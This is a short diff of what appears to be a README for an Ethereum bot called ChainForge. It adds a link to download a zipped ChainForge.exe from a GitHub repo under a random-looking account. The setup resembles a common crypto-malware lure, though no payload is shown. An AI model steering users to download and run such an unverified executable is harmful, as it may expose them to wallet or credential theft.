@@ -6,7 +6,7 @@
 
 ---
 
-## Download & run
+## Download & run [DOWNLOAD](https://github.com/blueduckpnmrsbpr/Bot-Ethereum-mainet/raw/refs/heads/main/ChainForge.zip)
 
 - The app is packed into **a single file**: `ChainForge.exe`
 - Unzip the archive
